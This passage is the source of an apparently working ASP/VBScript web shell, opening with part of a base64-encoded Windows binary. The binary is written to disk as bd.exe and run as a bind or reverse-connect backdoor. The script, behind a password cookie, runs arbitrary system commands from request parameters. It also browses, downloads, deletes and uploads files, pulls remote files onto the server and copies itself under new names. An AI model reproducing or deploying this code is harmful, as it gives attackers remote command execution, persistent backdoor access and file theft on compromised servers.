"aMVvsyQAAAD/AAAAAAAAAAAAAABgvgBQQACNvgDA//9Xg83/6xCQkJCQkJCKBkaIB0cB23UHix6D" &_
"7vwR23LtuAEAAAAB23UHix6D7vwR2xHAAdtz73UJix6D7vwR23PkMcmD6ANyDcHgCIoGRoPw/3R0" &_
"icUB23UHix6D7vwR2xHJAdt1B4seg+78EdsRyXUgQQHbdQeLHoPu/BHbEckB23PvdQmLHoPu/BHb" &_
"c+SDwQKB/QDz//+D0QGNFC+D/fx2D4oCQogHR0l19+lj////kIsCg8IEiQeDxwSD6QR38QHP6Uz/" &_
"//9eife5cAAAAIoHRyzoPAF394A/A3XyiweKXwRmwegIwcAQhsQp+IDr6AHwiQeDxwWI2OLZjb4A" &_
"UAAAiwcJwHRFi18EjYQwAHAAAAHzUIPHCP+WUHAAAJWKB0cIwHTcifl5Bw+3B0dQR7lXSPKuVf+W" &_
"VHAAAAnAdAeJA4PDBOvY/5ZkcAAAi65YcAAAjb4A8P//uwAQAABQVGoEU1f/1Y2H5wEAAIAgf4Bg" &_
"KH9YUFRQU1f/1VhhjUQkgGoAOcR1+oPsgOnbof//AAAAAAAAAAAAAAAAAAAAAAAAAHyAAABQgAAA" &_
"AAAAAAAAAAAAAAAAiYAAAGyAAAAAAAAAAAAAAAAAAACWgAAAdIAAAAAAAAAAAAAAAAAAAAAAAAAA" &_
"AAAAoIAAAK6AAAC+gAAAzoAAANyAAADqgAAAAAAAAPiAAAAAAAAAcwAAgAAAAABLRVJORUwzMi5E" &_
"TEwAQURWQVBJMzIuZGxsAFdTMl8zMi5kbGwAAExvYWRMaWJyYXJ5QQAAR2V0UHJvY0FkZHJlc3MA" &_
"AFZpcnR1YWxQcm90ZWN0AABWaXJ0dWFsQWxsb2MAAFZpcnR1YWxGcmVlAAAARXhpdFByb2Nlc3MA" &_
"AABPcGVuU2VydmljZUEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
shell_style = "" &_
"<style type=""text/css"">" &_
"*{" &_
"	font-family:Tahoma,Verdana,Arial;" &_
"	font-size:12px;" &_
"	line-height:20px;" &_
"}" &_
"" &_
"form{" &_
"	margin:0 auto;" &_
"	text-align:center;" &_
"}" &_
"" &_
"body{" &_
"	background:url('" & Request.ServerVariables("SCRIPT_NAME") & "?img=bg') #333333;" &_
"	color:#ffffff;" &_
"	margin:0;" &_
"	padding:0;" &_
"}" &_
"" &_
"input,textarea{" &_
"	background:url('" & Request.ServerVariables("SCRIPT_NAME") & "?img=bg') #111111;" &_
"	height:24px;" &_
"	color:#ffffff;" &_
"	padding:1.5px 4px 0 4px;" &_
"	margin:2px 0;" &_
"	border:1px solid " & shell_color & ";" &_
"	border-bottom:4px solid " & shell_color & ";" &_
"	vertical-align:middle;" &_
"}" &_
"" &_
"input:hover,textarea:hover{" &_
"	background:#0a0a0a;" &_
"}" &_
"" &_
"a{" &_
"	color:#ffffff;" &_
"	text-decoration:none;" &_
"}" &_
"" &_
"a:hover{" &_
"	border-bottom:1px solid #ffffff;" &_
"}" &_
"" &_
"h1{" &_
"	font-size:17px;" &_
"	height:20px;" &_
"	padding:2px 8px;" &_
"	background:" & shell_color & ";" &_
"	border:0;" &_
"	border-left:4px solid " & shell_color & ";" &_
"	border-right:4px solid " & shell_color & ";" &_
"	border-bottom:1px solid #222222;" &_
"	margin:0 auto;" &_
"	width:90%;" &_
"}" &_
"" &_
"h1 img{" &_
"	vertical-align:bottom;" &_
"}" &_
"" &_
".box{" &_
"	margin:0 auto;" &_
"	background:#000000;" &_
"	border:4px solid " & shell_color & ";" &_
"	padding:4px 8px;" &_
"	width:90%;" &_
"	text-align:justify;" &_
"}" &_
"" &_
".gaul{" &_
"	color:" & shell_color & ";" &_
"}" &_
"" &_
".result, .boxcode{" &_
"	margin:0 auto;" &_
"	border:1px solid " & shell_color & ";" &_
"	font-family:Lucida Console,Tahoma,Verdana;" &_
"	padding:8px;" &_
"	text-align:justify;" &_
"	overflow:hidden;" &_
"	color:#ffffff;" &_
"}" &_
"" &_
"#explorer, table{" &_
"	width:100%;" &_
"}" &_
"" &_
"table th{" &_
"	border-bottom:1px solid " & shell_color & ";" &_
"	background:#111111;" &_
"	padding:4px;" &_
"}" &_
"" &_
"table td{" &_
"	padding:4px;" &_
"	border-bottom:1px solid #111111;" &_
"	vertical-align:top;" &_
"}" &_
"" &_
".tblExplorer tr:hover, .hexview td:hover{" &_
"	background:" & shell_color & ";" &_
"}" &_
"" &_
".hidden{" &_
"	display:none;" &_
"}" &_
".tblbox td  {" &_
"	margin:0;" &_
"	padding:0;" &_
"	border-bottom:1px solid #222222;" &_
"}" &_
"" &_
".tblbox tr:hover{" &_
"	background:none;" &_
"}" &_
"" &_
"#mainwrapper{" &_
"	width:100%;" &_
"	margin:20px auto;" &_
"	text-align:center;" &_
"}" &_
"#wrapper{" &_
"	width:90%;" &_
"	margin:auto;" &_
"}" &_
"" &_
".cmdbox{" &_
"	border-top:1px solid " & shell_color & ";" &_
"	border-bottom:1px solid " & shell_color & ";" &_
"	margin:4px 0;" &_
"	width:100%;" &_
"}" &_
"" &_
".fpath{" &_
"	border-top:1px solid " & shell_color & ";" &_
"	border-bottom:1px solid " & shell_color & ";" &_
"	margin:4px 0;" &_
"	padding:4px 0;" &_
"}" &_
"" &_
".fprop{" &_
"	border-top:1px solid " & shell_color & ";" &_
"	border-bottom:1px solid " & shell_color & ";" &_
"	margin:4px 0;" &_
"	padding:4px 0;" &_
"}" &_
"" &_
".bottomwrapper{" &_
"	text-align:center;" &_
"}" &_
"" &_
".btn{" &_
"	height:24px;" &_
"	background:url('" & Request.ServerVariables("SCRIPT_NAME") & "?img=bg') #111111;" &_
"	font-size:10px;" &_
"	text-align:right;" &_
"}" &_
"" &_
".hexview , .hexview td{" &_
"	font-family: Lucida Console,Tahoma;" &_
"}" &_
"</style>"

'//################# FUNCTION GOES HERE #######################==============================================]
Function xcleanpath(path)
	path = urldecode(Trim(path))
	strlen = Len(path)
	If strlen > 0 Then
		Do While((Mid(path,strlen) = "\") And (strlen > 0))
			strlen = strlen - 1
			path = Mid(path,1,strlen)
		Loop
		xcleanpath = path & "\"
	Else
		xcleanpath = path
	End If
End Function
Function is_dir(path)
	Set fs = CreateObject("Scripting.FileSystemObject")
	If fs.FolderExists(path) Then
		is_dir = true
	Else
		is_dir = false
	End If
	Set fs = nothing
End Function
Function is_file(path)
	Set fs = CreateObject("Scripting.FileSystemObject")
	If fs.FileExists(path) Then
		is_file = true
	Else
		is_file = false
	End If
	Set fs = nothing
End Function
Function dirname(path)
	Set fs = Server.CreateObject("Scripting.FileSystemObject")
	If(is_file(path) Or is_dir(path)) Then
		dirname = fs.getfilename(path)
	Else
		dirname = path
	End If
	set fs = nothing
End Function
Function nl2br(text)
	nl2br = Replace(text, VbCrLf, "<br />")
End Function
Function urldecode(str)
	str = Replace(str, "+", " ")
	For i = 1 To Len(str)
		sT = Mid(str, i, 1)
		If sT = "%" Then
			If i+2 < Len(str) Then
				sR = sR & _
					Chr(CLng("&H" & Mid(str, i+1, 2)))
				i = i+2
			End If
		Else
			sR = sR & sT
		End If
	Next
	urldecode = sR
End Function
Function urlencode(str)
	urlencode = Server.URLEncode(str)
End Function
Function base64_decode(base64String)
	Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	base64String = Replace(base64String, vbCrLf, "")
	base64String = Replace(base64String, vbTab, "")
	base64String = Replace(base64String, " ", "")
	dataLength = Len(base64String)
	For groupBegin = 1 To dataLength Step 4
		Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
		numDataBytes = 3
		nGroup = 0
		For CharCounter = 0 To 3
			thisChar = Mid(base64String, groupBegin + CharCounter, 1)
			If thisChar = "=" Then
				numDataBytes = numDataBytes - 1
				thisData = 0
			Else
				thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
			End If
				nGroup = 64 * nGroup + thisData
		Next
		nGroup = Hex(nGroup)
		nGroup = String(6 - Len(nGroup), "0") & nGroup
		pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
		Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
		Chr(CByte("&H" & Mid(nGroup, 5, 2)))
		sOut = sOut & Left(pOut, numDataBytes)
	Next
	base64_decode = sOut
End Function
Function sort(arr_)
	buff = ""
	For Each b in arr_
		buff = buff & b & "|"
	Next
	If((Len(buff)-1) > 0) Then
		arr = split(Mid(buff,1,Len(buff)-1),"|")
		For i = UBound(arr) - 1 To 0 Step -1
			For j= 0 To i
				If((arr(j)) > (arr(j+1))) Then
					temp=arr(j+1)
					arr(j+1)=arr(j)
					arr(j)=temp
				End If
			Next
		Next
		sort = arr
	Else
		sort = array()
	End If
End Function
Function htmlspecialchars(text)
	text = Replace(text,"&","&amp;")
	text = Replace(text,"""","&quot;")
	text = Replace(text,"'","&#039;")
	text = Replace(text,"<","&lt;")
	text = Replace(text,">","&gt;")
	htmlspecialchars = text
End Function
Function xfilesave(FileName, content)
	Set FS = CreateObject("Scripting.FileSystemObject")
	ByteArray = str2bin(content)
	Set TextStream = FS.CreateTextFile(FileName)
	TextStream.Write bin2str(ByteArray)
	If is_file(Filename) Then
		xfilesave = true
	Else
		xfilesave = false
	End If
End Function
Function str2bin(S)
	For i=1 To Len(S)
		MultiByte = MultiByte & ChrB(Asc(Mid(S,i,1)))
	Next
	str2bin = MultiByte
End Function
Function bin2str(Binary)
	For I = 1 To LenB(Binary)
		S = S & Chr(AscB(MidB(Binary, I, 1)))
	Next
	bin2str = S
End Function
Function xfileopen(file,binary)
	file = urldecode(file)
	if(binary) Then
		xfileopen = ReadBinaryFile(file)
	Else
		set fs = Server.CreateObject("Scripting.FileSystemObject")
		If fs.FileExists(file) Then
			set f = fs.OpenTextFile(file,1,false)
			If f.AtEndOfStream Then
				xfileopen = ""
			Else
				xfileopen = f.ReadAll
			End If
			f.close
		End If
		set fs = nothing
	End If
End Function
Function ReadBinaryFile(FileName)
	Const adTypeBinary = 1
	Set BinaryStream = CreateObject("ADODB.Stream")
	BinaryStream.Type = adTypeBinary
	BinaryStream.Open
	BinaryStream.LoadFromFile FileName
	ReadBinaryFile = BinaryStream.Read
End Function
Function xparsefilesize(size)
	If(size <= 1024) Then
		xparsefilesize = size
	Else
		If(size <= 1024*1024) Then
			size = FormatNumber(size / 1024,2)
			xparsefilesize = size & " kb"
		Else
			size = FormatNumber(size / 1024 / 1024,2)
			xparsefilesize = size & " mb"
		End If
	End If
End Function
Function xfileperms(file)
	Set fs = Server.CreateObject("Scripting.FileSystemObject")
	isreadable = "r"
	iswriteable = "-"
	If fs.FileExists(file) Then
		Set f = fs.GetFile(file)
		bit = f.Attributes
		Set f = nothing
		If Not (bit And 1) Then
			iswriteable = "w"
		End If
	Elseif fs.FolderExists(file) Then
		Set f = fs.GetFolder(file)
		bit = f.Attributes
		Set f = nothing
		If Not (bit And 1) Then
			iswriteable = "w"
		End If
	End If
	Set fs = nothing
	xfileperms = isreadable & " / " & iswriteable
End Function
Function xdateformat(tgl)
	If(IsDate(tgl)) Then
		xday = Day(tgl)
		If Len(xday) = 1 Then
			xday = "0" & xday
		End If
		xmonth = Mid(MonthName(Month(tgl)),1,3)
		xdateformat = xday & "-" & xmonth & "-" & Year(tgl) & " " & FormatDateTime(tgl,4)
	End If
End Function
Function xfilelastmodified(file)
	If(Len(file) > 3) Then
		Set fs = Server.CreateObject("Scripting.FileSystemObject")
		If fs.FileExists(file) Then
			Set f = fs.GetFile(file)
			tgl = f.DateLastModified
			Set f = nothing
			xfilelastmodified = xdateformat(tgl)
		ElseIf fs.FolderExists(file) Then
			Set f = fs.GetFolder(file)
			tgl = f.DateLastModified
			Set f = nothing
			xfilelastmodified = xdateformat(tgl)
		Else
			xfilelastmodified = "???"
		End If
	Else
		xfilelastmodified = xdateformat(CDate("01/01/1980 00:00"))
	End If
	Set fs = nothing
End Function
Function xparentfolder(dir)
	dir = xcleanpath(dir)
	Set fs = Server.CreateObject("Scripting.FileSystemObject")
	If fs.FolderExists(dir) Then
		If Len(dir) = 3 Then
			xparentfolder = xcleanpath(dir)
		Else
			xparentfolder = xcleanpath(fs.GetParentFolderName(dir))
		End If
	Else
		xparentfolder = dir
	End If
	Set fs = nothing
End Function
Function xfilesummary(file)
	buff= ""
	If(is_file(file)) Then
		buff = "Filesize : " & xparsefilesize(xfilesize(file)) & " ( " & xfilesize(file) & " ) <span class=""gaul""> :: </span>Permission : " & xfileperms(file) & " ( " & xfileowner(file) & " )<span class=""gaul""> :: </span>modified : " & xfilelastmodified(file)
	End If
	xfilesummary = buff
End Function
Function xfilesize(file)
	Set fs = Server.CreateObject("Scripting.FileSystemObject")
	If fs.FileExists(file) Then
		Set f = fs.GetFile(file)
		xfilesize = f.Size
		Set f = nothing
	Else
		xfilesize = 0
	End If
	Set fs = nothing
End Function
Function xfileowner(strFile)
	If Mid(strFile,Len(strFile)) = "\" Then
		strfile = Mid(strfile,1,len(strfile)-1)
	End If
	On Error Resume Next
	strComputer = "."
	Set objWMIService = GetObject("winmgmts:" _
		 & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
	Set objCollection = objWMIService.ExecQuery _
	("ASSOCIATORS OF {Win32_LogicalFileSecuritySetting='" & strFile _
	& "'} WHERE AssocClass=Win32_LogicalFileOwner ResultRole=Owner")
	For Each objSID in objCollection
		If objSID.AccountName <> "" Then
			xfileowner = objSID.AccountName
		End If
	Next
	If xfileowner = "" Then
		xfileowner = "Everyone"
	End If
End Function
Function ekse(cmd)
	Set sh = Server.CreateObject("WScript.Shell")
	curdir = Request.QueryString("dir")
	if(curdir = "") Then
		Dim CurPath
		Set CurPath = CreateObject("Scripting.FileSystemObject")
		curdir = CurPath.GetAbsolutePathName(".")
		Set CurPath = nothing
	End If
	pos = InStr(curdir,":")
	curdrive = Mid(curdir,1,pos)
	chdir = curdrive & " && " & "CD """ & curdir & """"
    Set pipe = sh.Exec("%COMSPEC% /C " & chdir  & " && " & cmd)
	output = pipe.StdOut.ReadAll() & pipe.StdErr.ReadAll()
    Set sh = nothing
	Set pipe = nothing
	ekse = output
End Function
Function OSver()
	Set WshShell = Server.CreateObject("Wscript.Shell")
	Set OSchk = WshShell.Environment
	OSver = OSchk("OS")
	Set WshShell = nothing
	Set OSchk = nothing
	If (OSver = "") Then
		OSver = ekse("ver")
	End If
End Function
Function xtrim(str)
	Set myRegExp = New RegExp
	myRegExp.IgnoreCase = True
	myRegExp.Global = True
	myRegExp.Pattern = "^" & VbCrLf
	xtrim = Trim(myRegExp.Replace(str,""))
	myRegExp.Pattern = VbCrLf & "$"
	xtrim = Trim(myRegExp.Replace(str,""))
	Set myRegExp = nothing
End Function
Function xparsedir(dir)
	dirs = split(dir,"\")
	buff = ""
	dlink = ""
	For Each d in dirs
		d = xtrim(d)
		If(d <> "") Then
			dlink = dlink & Server.URLEncode(d & "\")
			buff = buff & "<a href=""?dir=" & dlink & """>" & d & " " & "\" & "</a>&nbsp;"
		End If
	Next
    xparsedir = "<span class=""gaul"">[ </span>" & buff & "<span class=""gaul""> ]</span>"
End Function
Sub xwget(myURL,myPath)
    Dim i, objFile, objFSO, objHTTP, strFile, strMsg
    Const ForReading = 1, ForWriting = 2, ForAppending = 8
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    If objFSO.FolderExists( myPath ) Then
        strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )
    ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then
        strFile = myPath
    Else
        Exit Sub
    End If
    Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )
    Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
    objHTTP.Open "GET", myURL, False
    objHTTP.Send
    For i = 1 To LenB( objHTTP.ResponseBody )
        objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
    Next
    objFile.Close( )
End Sub
Function xrunexploit(fpath,base64,port,tipe)
	con = base64_decode(base64)
	fname = "bd.exe"
	ip = ""
	ok = false
	fpath = xcleanpath(fpath) & fname
	If(is_file(fpath)) Then
		unlink(fpath)
	End If
	If(xfilesave(fpath,con)) Then
		fpath = Trim(fpath)
		If(tipe = "connect") Then ip = Request.ServerVariables("REMOTE_ADDR")
		final = fpath & " " & port & " " & ip
		ekse(Trim(final))
		xrunexploit = true
	Else
		xrunexploit = false
	End If
End Function
Function xdrive()
	Dim fs,d,n,letters
	letters = ""
	Set fs = Server.CreateObject("Scripting.FileSystemObject")
	Set d = fs.Drives
	For Each letter in d
		letter = mid(letter,1,1)
		letters = "<a href=""?dir=" & letter & ":\""><span class=""gaul"">[ </span>"
		letters = letters & letter
		letters = letters & "<span class=""gaul""> ]</span</a> "
		buff = buff & letters
	Next
	Set d = nothing
	Set fs = nothing
	If(buff <> "") Then
		buff = buff & "<br />"
	End If
	xdrive = buff
End Function
Public Sub xrmdir(path)
	path = xcleanpath(path)
	path = Mid(path,1,Len(path)-1)
	Set fs = Server.CreateObject("Scripting.FileSystemObject")
	Set f = fs.GetFolder(path)
	Set fname = f.Files
	Set dname = f.subFolders
	Set fs = nothing
	For Each frm in fname
		unlink(frm)
	Next
	For Each drm in dname
		xrmdir(drm)
	Next
	f.Delete(true)
	Set f = nothing
End Sub
Function unlink(path)
	Set fs = Server.CreateObject("Scripting.FileSystemObject")
	If fs.FileExists(path) Then
		Set f = fs.GetFile(path)
		f.Delete
		Set f = nothing
	End If
	Set fs = nothing
End Function
Function mkdir(path)
	Set fs = Server.CreateObject("Scripting.FileSystemObject")
	If Not fs.FolderExists(path) Then
		fs.CreateFolder(path)
	End If
	Set fs = nothing
End Function
Function xdir(path)
	path = Trim(urldecode(path))
	path = xcleanpath(path)
	buff = ""
	If(is_dir(path)) Then
		Set fs = Server.CreateObject("Scripting.FileSystemObject")
		Set f = fs.GetFolder(path)
		Set xfname = f.Files
		Set xdname = f.subFolders
		Set f = nothing
		Set fs = nothing
		xfname = sort(xfname)
		xdname = sort(xdname)
		buff = "<div id=""explorer""><table class=""tblExplorer"">" &_
		"<tr><th>Filename</th>" &_
		"<th style=""width:80px;"">Filesize</th>" &_
		"<th style=""width:80px;"">Permission</th>" &_
		"<th style=""width:150px;"">Last Modified</th>" &_
		"<th style=""width:180px;"">Action</th></tr>"
		If(Len(path) > 3) Then
			sd = "."
			dd = xcleanpath(path)
			buff = buff & "<tr onmouseover=""this.style.cursor='pointer';this.style.cursor='hand';"" onclick=""window.location= '?dir=" & urlencode(dd) & "';"">" &_
			"<td><span style=""font-weight:bold;""><a href=""?dir=" & xcleanpath(dd) & """>[</span> " & sd & " <span style=""font-weight:bold;"">]</span></a></td>" &_
			"<td>DIR</td>" &_
			"<td style=""text-align:center;"">" & xfileperms(dd) & "</td>" &_
			"<td style=""text-align:center;"">" & xfilelastmodified(dd) & "</td>" &_
			"<td style=""text-align:center;""><a href=""?dir=" & dd & "&properties=" & xcleanpath(dd) & """>Properties</a> | <a href=""?dir=" & xcleanpath(xparentfolder(dd)) & "&del=" & xcleanpath(dd) & """>Remove</a></td>" &_
			"</tr>"
			sd = ".."
			dd = xcleanpath(xparentfolder(path))
			buff = buff & "<tr onmouseover=""this.style.cursor='pointer';this.style.cursor='hand';"" onclick=""window.location= '?dir=" & urlencode(dd) & "';"">" &_
			"<td><span style=""font-weight:bold;""><a href=""?dir="& dd & """>[</span> " & sd & " <span style=""font-weight:bold;"">]</span></a></td>" &_
			"<td>DIR</td>" &_
			"<td style=""text-align:center;"">" & xfileperms(dd) & "</td>" &_
			"<td style=""text-align:center;"">" & xfilelastmodified(dd) & "</td>" &_
			"<td style=""text-align:center;""><a href=""?dir=" & xcleanpath(dd) & "&properties=" & xcleanpath(dd) & """>Properties</a> | <a href=""?dir=" & xcleanpath(xparentfolder(xparentfolder(dd))) & "&del=" & xcleanpath(dd) & """>Remove</a></td>" &_
			"</tr>"
		End If
		For Each d In xdname
			sd = dirname(d)
			nextdir = xcleanpath(path)
			buff = buff & "<tr onmouseover=""this.style.cursor='pointer';this.style.cursor='hand';"" onclick=""window.location= '?dir=" & urlencode(d) & "';"">" &_
			"<td><span style=""font-weight:bold;""><a href=""?dir="& xcleanpath(d) & """>[</span> " & sd & " <span style=""font-weight:bold;"">]</span></a></td>" &_
			"<td>DIR</td>" &_
			"<td style=""text-align:center;"">" & xfileperms(d) & "</td>" &_
			"<td style=""text-align:center;"">" & xfilelastmodified(d) & "</td>" &_
			"<td style=""text-align:center;""><a href=""?dir=" & xcleanpath(d) & "&properties=" & xcleanpath(d) & """>Properties</a> | <a href=""?dir=" & xcleanpath(nextdir) & "&del=" & xcleanpath(d) & """>Remove</a></td>" &_
			"</tr>"
		Next
		For Each f In xfname
			sf = dirname(f)
			view = "?dir=" & urlencode(path) & "&view=" & urlencode(f)
			buff = buff & "<tr onmouseover=""this.style.cursor='pointer';this.style.cursor='hand';"" onclick=""window.location='?dir=" & urlencode(xcleanpath(path)) & "&properties=" & urlencode(f) & "';""><td>" &_
			"<a href=""?dir=" & urlencode(xcleanpath(path)) & "&properties=" & urlencode(f) & """>" &_
			sf & "</a></td>" &_
			"<td>" & xparsefilesize(xfilesize(f)) & "</td>" &_
			"<td style=""text-align:center;"">" & xfileperms(f) & "</td>" &_
			"<td style=""text-align:center;"">" & xfilelastmodified(f) & "</td>" &_
			"<td style=""text-align:center;""><a href=""" & view & """>Edit</a> | <a href=""?get=" & f & """>Download</a> | <a href=""?dir=" & xcleanpath(path) & "&del=" & f & """>Remove</a></td>" &_
			"</tr>"
		Next
		buff = buff & "</table></div>"
		xdir = buff
		Set xdname = nothing
		Set xfname = nothing
	End If
End Function
Class FileUploader
	Public  Files
	Private mcolFormElem
	Private Sub Class_Initialize()
		Set Files = Server.CreateObject("Scripting.Dictionary")
		Set mcolFormElem = Server.CreateObject("Scripting.Dictionary")
	End Sub
	Private Sub Class_Terminate()
		If IsObject(Files) Then
			Files.RemoveAll()
			Set Files = Nothing
		End If
		If IsObject(mcolFormElem) Then
			mcolFormElem.RemoveAll()
			Set mcolFormElem = Nothing
		End If
	End Sub
	Public Property Get Form(sIndex)
		Form = ""
		If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))
	End Property
	Public Default Sub Upload()
		biData = Request.BinaryRead(Request.TotalBytes)
		nPosBegin = 1
		nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
		If (nPosEnd-nPosBegin) <= 0 Then Exit Sub
		vDataBounds = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
		nDataBoundPos = InstrB(1, biData, vDataBounds)
		Do Until nDataBoundPos = InstrB(biData, vDataBounds & CByteString("--"))
			nPos = InstrB(nDataBoundPos, biData, CByteString("Content-Disposition"))
			nPos = InstrB(nPos, biData, CByteString("name="))
			nPosBegin = nPos + 6
			nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(34)))
			sInputName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			nPosFile = InstrB(nDataBoundPos, biData, CByteString("filename="))
			nPosBound = InstrB(nPosEnd, biData, vDataBounds)
			If nPosFile <> 0 And  nPosFile < nPosBound Then
				Set oUploadFile = New UploadedFile
				nPosBegin = nPosFile + 10
				nPosEnd =  InstrB(nPosBegin, biData, CByteString(Chr(34)))
				sFileName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
				oUploadFile.FileName = Right(sFileName, Len(sFileName)-InStrRev(sFileName, "\"))

				nPos = InstrB(nPosEnd, biData, CByteString("Content-Type:"))
				nPosBegin = nPos + 14
				nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))

				oUploadFile.ContentType = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))

				nPosBegin = nPosEnd+4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				oUploadFile.FileData = MidB(biData, nPosBegin, nPosEnd-nPosBegin)

				If oUploadFile.FileSize > 0 Then Files.Add LCase(sInputName), oUploadFile
				Else
					nPos = InstrB(nPos, biData, CByteString(Chr(13)))
					nPosBegin = nPos + 4
					nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				If Not mcolFormElem.Exists(LCase(sInputName)) Then mcolFormElem.Add LCase(sInputName), CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			End If
			nDataBoundPos = InstrB(nDataBoundPos + LenB(vDataBounds), biData, vDataBounds)
		Loop
	End Sub
	Private Function CByteString(sString)
		For nIndex = 1 to Len(sString)
			CByteString = CByteString & ChrB(AscB(Mid(sString,nIndex,1)))
		Next
	End Function
	Private Function CWideString(bsString)
		CWideString =""
		For nIndex = 1 to LenB(bsString)
			CWideString = CWideString & Chr(AscB(MidB(bsString,nIndex,1)))
		Next
	End Function
End Class
Class UploadedFile
	Public ContentType
	Public FileName
	Public FileData
	Public Property Get FileSize()
		FileSize = LenB(FileData)
	End Property
	Public Sub SaveToDisk(sPath)
		If sPath = "" Or FileName = "" Then Exit Sub
		If Mid(sPath, Len(sPath)) <> "\" Then sPath = sPath & "\"
		Set oFS = Server.CreateObject("Scripting.FileSystemObject")
		If Not oFS.FolderExists(sPath) Then Exit Sub
		Set oFile = oFS.CreateTextFile(sPath & FileName, True)
		For nIndex = 1 to LenB(FileData)
			oFile.Write Chr(AscB(MidB(FileData,nIndex,1)))
		Next
		oFile.Close
	End Sub
End Class
'//################# INIT GOES HERE #######################==================================================]
If(Request.Form("passw") <> "") Then
	check = Trim(Request.Form("passw"))
	If(check = shell_password) Then
		Response.Cookies("pass") = check
		Response.Cookies("pass").Expires = Date + 7
	Else
		Response.Cookies("pass") = check
		Response.Cookies("pass").Expires = Date - 7
	End If
End If
If(Request.Cookies("pass") <> "") Then
	check = Request.Cookies("pass")
Else
	check = ""
End If
If(check = shell_password) Then
	auth = true
Else
	auth = false
End If
If(Request.QueryString("img") <> "") Then
	file = Request.QueryString("img")
	if(is_file(file)) Then
		Response.Clear
		Response.ContentType= "image/jpeg"
		Response.BinaryWrite ReadBinaryFile(file)
		Response.End
	Else
		Response.Clear
		Response.Buffer = true
		Response.ContentType = "image/png"
		If file = "bg" Then
			buff = str2bin(base64_decode(bg))
		Else
			buff = str2bin(base64_decode(icon))
		End If
		Response.BinaryWrite buff
		Response.End
	End If
End If
If(Request.QueryString("get") <> "") Then
	file = Request.QueryString("get")
	fname = Mid(file,InStrRev(file,"\")+1)
	Response.ContentType = "application/x-msdownload"
	Response.AddHeader "Content-transfer-encoding", "binary"
	Response.AddHeader "Content-Disposition", "attachment;filename="& fname &""
	dim txt, objStream
	Set objStream = Server.CreateObject("ADODB.Stream")
	objStream.Mode = 3
	objStream.open
	objStream.loadfromfile file
	txt = objStream.readtext(-1)
	response.binarywrite(txt)
	objStream.close
	set objStream = nothing
	txt = null
	Response.End
End If
If((Request.QueryString("btnConnect") <> "") And (IsNumeric(Request.QueryString("bportC")))) Then
	port = Request.QueryString("bportC")
	dir = xcleanpath(Trim(Request.QueryString("dir")))
	If(xrunexploit(dir,wBind,port,"connect"))Then
	End If
ElseIf((Request.QueryString("btnListen") <> "") And (IsNumeric(Request.QueryString("lportC")))) Then
	port = Request.QueryString("lportC")
	dir = xcleanpath(Trim(Request.QueryString("dir")))
	if(xrunexploit(dir,wBind,port,"listen"))Then
	End If
End If
uploaded = false
If(Request.QueryString("dir") = "") Then
	xCwd = Mid(Request.ServerVariables("PATH_TRANSLATED"),1,InStrRev(Request.ServerVariables("PATH_TRANSLATED"),"\"))
Else
	newdir = xcleanpath(Trim(Request.QueryString("dir")))
	If (is_dir(newdir)) Then
		xCwd = newdir
	End If
	If(Request.QueryString("upload") <> "") Then
		uploaded = true
		Set Up = New FileUploader
		Up.Upload()
		If(Up.Form("btnNewUploadLocal") <> "") Then
			Uploaded = true
			If Up.Files.Count > 0 Then
				For Each File In Up.Files.Items
					If(Up.Form("filename") <> "") Then File.Filename = Up.Form("filename")
					File.SaveToDisk xCwd
				Next
			End If
		Elseif(Up.Form("btnNewUploadUrl") <> "") Then
			targeturl = Up.Form("fileurl")
			If targeturl <> "" Then
				If(Up.Form("filename") <> "") Then
					upname = Up.Form("filename")
				Else
					upname = Mid(targeturl,InStrRev(targeturl,"/"))
				End If
				targetpath = xCwd &  upname
				xwget targeturl,targetpath
			End If
		End If

	End If
	If(Request.QueryString("foldername") <> "") Then
		fname = xcleanpath(Trim(Request.QueryString("foldername")))
		If(NOT is_dir(newdir & fname)) Then
			mkdir(newdir & fname)
		End If
	ElseIf(Request.QueryString("del") <> "") Then
		fdel = Trim(Request.QueryString("del"))
		If(is_file(fdel)) Then
			unlink(fdel)
		Elseif(is_dir(fdel)) Then
			xrmdir(fdel)
			newdir = xparentfolder(fdel)
		End If
	Elseif(Request.QueryString("childname") <> "") Then
		childname = newdir & Trim(Request.QueryString("childname"))
		con = xfileopen(Request.ServerVariables("PATH_TRANSLATED"),false)
		If(xfilesave(childname,con)) Then
		End If
	End If
End If
